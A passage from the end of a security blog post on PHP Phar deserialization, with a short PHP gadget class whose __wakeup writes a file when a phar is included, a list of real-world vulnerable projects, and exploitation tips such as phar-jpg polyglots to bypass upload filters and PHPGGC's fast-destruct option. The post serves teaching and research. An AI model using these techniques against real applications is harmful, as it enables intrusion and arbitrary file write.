</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">log</span>
<span class="p">{</span>
	<span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s2">"log.txt"</span><span class="p">;</span>
	<span class="k">public</span> <span class="nv">$data</span><span class="o">=</span><span class="s2">"log"</span><span class="p">;</span>
    <span class="k">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// output: rips</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'phar://payload.phar'</span><span class="p">);</span>


<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="phar-deserialization-real-world-vulnerabilities"><span class="mr-2">Phar Deserialization Real World Vulnerabilities</span><a href="#phar-deserialization-real-world-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li><a href="https://github.com/dompdf/dompdf/pull/1903">DomPDF Phar Serialization</a></li>
  <li><a href="https://www.exploit-db.com/exploits/46634">LimeSurvey &lt; 3.16 - Remote Code Execution</a></li>
  <li><a href="https://github.com/mpdf/mpdf/issues/949">mpdf Insecure PHP deserialization through phar:// wrapper</a></li>
  <li><a href="https://github.com/pear/Archive_Tar/issues/33">TCPDF Phar Deserialization</a></li>
  <li><a href="https://blog.ripstech.com/2018/phpbb3-phar-deserialization-to-remote-code-execution/">phpbb3 Phar Deserialization</a></li>
  <li><a href="https://www.exploit-db.com/exploits/46108">PEAR Archive_Tar1</a></li>
</ul>

<h3 id="useful-notes-1"><span class="mr-2">Useful Notes</span><a href="#useful-notes-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>Inclusion of the Phar file for deserialization can be local or remote</li>
  <li>If a file upload functionality only allows jpg, you can use a phar-jpg polyglot: https://github.com/kunte0/phar-jpg-polyglot</li>
  <li>If you are trying to leverage a __destruct magic method as part of your POP chain and the if destructor is never called, you can use ‚Äúfast destruct method‚Äù in PHPGGC to make sure it‚Äôs called right after the unserialize. The -f option with PHPGGC will place your popchain in an array and overwrite its entry with another value, losing the only reference to your instance.</li>
</ul>

<h3 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>https://blog.ripstech.com/2018/new-php-exploitation-technique/</li>
  <li>https://www.drupal.org/sa-core-2020-013</li>
  <li>https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</li>
  <li>https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066</li>
  <li>https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It‚Äôs-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</li>
  <li>https://blog.certimetergroup.com/it/articolo/security/polyglot_phar_deserialization_to_rce</li>
</ul>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/web-application-security/'>web application security</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/php-deserialization/"
          class="post-tag no-text-decoration" >php deserialization</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://x.com/snoopysecurity?lang=en-GB" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://x.com/snoopysecurity?lang=en-GB" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://www.linkedin.com/in/sam-sanoop-b80535252/" data-toggle="tooltip" data-placement="top"
          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
          <i class="fa-fw fab fa-linkedin"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Recently Updated</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/avoiding-smtp-injection/">Avoiding SMTP Injection: A Whitebox primer</a></li>
      
        
        
        
      <li><a href="/posts/chef-unsafe-deserialization/">Chef Yaml Deserialization Vulnerability</a></li>
      
        
        
        
      <li><a href="/posts/code-security-advent-calendar-answers/">Code Security Advent Calendar 2020 Answers</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/ctf/">ctf</a>
    
      
      <a class="post-tag" href="/tags/php-deserialization/">php deserialization</a>
    
      
      <a class="post-tag" href="/tags/exploit-education/">exploit education</a>
    
      
      <a class="post-tag" href="/tags/facebook-ctf/">facebook ctf</a>
    
      
      <a class="post-tag" href="/tags/yaml/">yaml</a>
    
      
      <a class="post-tag" href="/tags/zip-slip/">zip slip</a>
    
      
      <a class="post-tag" href="/tags/code-security-advent-calendar/">code security advent calendar</a>
    
      
      <a class="post-tag" href="/tags/domgoat/">domgoat</a>
    
      
      <a class="post-tag" href="/tags/drozer/">drozer</a>
    
      
      <a class="post-tag" href="/tags/ghost-xss/">ghost xss</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/09_opencats_php_object_injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1610825152"
    data-df="ll"
    >
  Jan 17, 2021
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>OpenCATS PHP Object Injection to Arbitrary File Write</h3>
            <div class="text-muted small">
              <p>
                





                Introduction

OpenCATS is an application tracking system that is written in PHP. More about OpenCATS can be seen here: https://www.opencats.org/. OpenCATS is vulnerable to PHP Object injection, by ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/suitecrm-phar-deserialization/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1620588352"
    data-df="ll"
    >
  May 10, 2021
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>SuiteCRM - Phar Deserialization to Code Execution</h3>
            <div class="text-muted small">
              <p>
                





                This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/

Introduction

uiteCRM is a free and open source Cus...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/ZAP-Scripting/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1440494752"
    data-df="ll"
    >
  Aug 25, 2015
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>ZAP Scripting</h3>
            <div class="text-muted small">
              <p>
                





                Zed Attack Proxy (ZAP) is an open-source web application security scanner/proxy that can be used to find vulnerabilities. This blog post is about Zed Attack Proxy‚Äôs Scripting capabilities and how i...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/code-security-advent-calendar-answers/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Code Security Advent Calendar 2020 Answers</p>
  </a>
  

  
  <a href="/posts/09_opencats_php_object_injection/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>OpenCATS PHP Object Injection to Arbitrary File Write</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/ctf/">ctf</a>
    
      
      <a class="post-tag" href="/tags/php-deserialization/">php deserialization</a>
    
      
      <a class="post-tag" href="/tags/exploit-education/">exploit education</a>
    
      
      <a class="post-tag" href="/tags/facebook-ctf/">facebook ctf</a>
    
      
      <a class="post-tag" href="/tags/yaml/">yaml</a>
    
      
      <a class="post-tag" href="/tags/zip-slip/">zip slip</a>
    
      
      <a class="post-tag" href="/tags/code-security-advent-calendar/">code security advent calendar</a>
    
      
      <a class="post-tag" href="/tags/domgoat/">domgoat</a>
    
      
      <a class="post-tag" href="/tags/drozer/">drozer</a>
    
      
      <a class="post-tag" href="/tags/ghost-xss/">ghost xss</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          ¬© 2025
          <a href="https://twitter.com/snoopysecurity">Sam Sanoop</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.
        </p>
      </div>
    </div>
  </div>
</footer>


    
      <!--
  mermaid-js loader
-->

<script src="https://cdn.jsdelivr.net/npm/mermaid@9.2.2/dist/mermaid.min.js"></script>

<script>
  (function () {

    function updateMermaid(event) {
      if (event.source === window && event.data &&
        event.data.direction === ModeToggle.ID) {

        const mode = event.data.message;

        if (typeof mermaid === "undefined") {
          return;
        }

        let expectedTheme = (mode === ModeToggle.DARK_MODE ? "dark" : "default");
        let config = {theme: expectedTheme};

        /* Re-render the SVG ‚Ä∫ <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function () {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    let initTheme = "default";

    if ($("html[data-mode=dark]").length > 0
      || ($("html[data-mode]").length == 0
        && window.matchMedia("(prefers-color-scheme: dark)").matches)) {
      initTheme = "dark";
    }

    let mermaidConf = {
      theme: initTheme  /* <default|dark|forest|neutral> */
    };

    /* Create mermaid tag */
    $("pre").has("code.language-mermaid").each(function () {
      let svgCode = $(this).children().html();
      $(this).addClass("unloaded");
      $(this).after(`<pre class=\"mermaid\">${svgCode}</pre>`);
    });

    mermaid.initialize(mermaidConf);

    window.addEventListener("message", updateMermaid);
  })();

</script>

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script>






  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1.11.6/dayjs.min.js,npm/dayjs@1.11.6/locale/en.min.js,npm/dayjs@1.11.6/plugin/relativeTime.min.js,npm/dayjs@1.11.6/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
  MathJax = {
    tex: {
      inlineMath: [              /* start/end delimiter pairs for in-line math */
        ['$','$'],
        ['\\(','\\)']
      ],
      displayMath: [             /* start/end delimiter pairs for display math */
        ['$$', '$$'],
        ['\\[', '\\]']
      ]
    }
  };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js">
  </script>


<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

